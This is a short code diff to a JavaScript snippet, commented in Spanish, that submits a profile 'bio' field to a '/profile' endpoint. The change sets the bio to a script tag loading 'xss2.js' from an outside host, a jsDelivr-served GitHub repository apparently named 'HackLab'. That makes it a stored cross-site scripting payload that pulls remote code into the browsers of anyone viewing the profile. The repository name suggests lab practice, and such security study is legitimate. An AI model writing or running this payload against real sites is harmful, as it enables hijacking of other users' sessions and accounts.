@@ -1,7 +1,7 @@
 (async () => {
   try {
     const url = '/profile'; // <-- relativo: apunta al origin de la página
-    const bioValue = ''; // cambiar según necesites
+    const bioValue = '<script src="https://cdn.jsdelivr.net/gh/Peezma/HackLab/xss2.js"></script>'; // cambiar según necesites
 
     const fd = new FormData();
     fd.append('bio', bioValue);
